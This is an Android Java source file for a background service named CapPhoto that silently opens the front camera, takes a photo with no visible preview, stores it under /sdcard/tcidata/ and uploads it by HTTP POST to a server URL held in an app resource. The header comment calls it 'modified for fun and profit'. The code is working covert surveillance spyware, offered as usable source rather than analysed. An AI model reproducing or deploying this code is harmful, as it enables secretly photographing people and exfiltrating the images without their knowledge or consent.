package intert.internet;

import android.app.Service;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import android.content.Context;
import android.content.Intent;
import android.hardware.Camera;
import android.hardware.Camera.CameraInfo;
import android.hardware.Camera.Parameters;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.InputStreamBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.util.EntityUtils;


/**
 * taken from internet modified for fun and profit
 */

public class CapPhoto extends Service {
    public FileSystemOp fso = new FileSystemOp();
    private SurfaceHolder sHolder;
    private Camera mCamera;
    private Parameters parameters;



    @Override
    public void onCreate()
    {
        super.onCreate();
        Log.d("CAM", "start");

        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy =
                    new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);};
        Thread myThread = null;


    }
    @Override
    public void onStart(Intent intent, int startId) {

        super.onStart(intent, startId);

        if (Camera.getNumberOfCameras() >= 2) {

            mCamera = Camera.open(CameraInfo.CAMERA_FACING_FRONT); }

        if (Camera.getNumberOfCameras() < 2) {
            mCamera = Camera.open();
        }
        SurfaceView sv = new SurfaceView(getApplicationContext());
        try {
            mCamera.setPreviewDisplay(sv.getHolder());
            parameters = mCamera.getParameters();
            mCamera.setParameters(parameters);
            mCamera.startPreview();
            mCamera.takePicture(null, null, mCall);
        } catch (IOException e) { e.printStackTrace(); }

        sHolder = sv.getHolder();
        sHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
    }

    Camera.PictureCallback mCall = new Camera.PictureCallback()
    {

        public void onPictureTaken(final byte[] data, Camera camera)
        {

            FileOutputStream outStream = null;
            try {
                boolean eksis = false;
                String path_img = "/sdcard/tcidata/";
                eksis = fso.CheckIfDirectoryExists(path_img);
                if (eksis == false) {
                    File sd = new File(path_img, "A");
                    if(!sd.exists()) {
                        sd.mkdirs();
                        Log.i("FO", "folder" + Environment.getExternalStorageDirectory());
                    }
                }

                Calendar cal = Calendar.getInstance();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
                String tar = (sdf.format(cal.getTime()));

                outStream = new FileOutputStream(path_img + tar + ".jpg");
                outStream.write(data);  outStream.close();

                Log.i("CAM", data.length + " byte written to:"+path_img+tar+".jpg");
                camkapa(sHolder);
                String filename =  tar +".jpg";
                String fpath = path_img + tar + ".jpg";
                String urlString = getString(R.string.ur1);
                do_upload(urlString, fpath, filename);
            } catch (FileNotFoundException e){
                Log.d("CAM", e.getMessage());
            } catch (IOException e){
                Log.d("CAM", e.getMessage());
            }}
    };


    protected void do_upload(String uri, String filep, String filen) {
        try {

            InputStream inputStream = new FileInputStream(new File(filep));

            byte[] data = fso.convertToByteArray(inputStream);
            HttpClient httpClient = new DefaultHttpClient();
            httpClient.getParams().setParameter(CoreProtocolPNames.USER_AGENT, System.getProperty("http.agent"));
            HttpPost httpPost = new HttpPost(uri);
            InputStreamBody inputStreamBody = new InputStreamBody(new ByteArrayInputStream(data), filen);
            MultipartEntity multipartEntity = new MultipartEntity();
            multipartEntity.addPart("file", inputStreamBody);
            httpPost.setEntity(multipartEntity);
            HttpResponse httpResponse = httpClient.execute(httpPost);
            String stringResponse = EntityUtils.toString(httpResponse.getEntity());
        }
        catch (FileNotFoundException e1) {
            fso._do_log_debug(e1, "do_upload");
        }
        catch (ClientProtocolException e) {
            fso._do_log_debug(e, "do_upload");

        } catch (IOException e) {
            fso._do_log_debug(e, "do_upload");
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void camkapa(SurfaceHolder sHolder) {

        if (null == mCamera)
            return;
        mCamera.stopPreview();
        mCamera.release();
        mCamera = null;
        Log.i("CAM", " closed");
    }

}
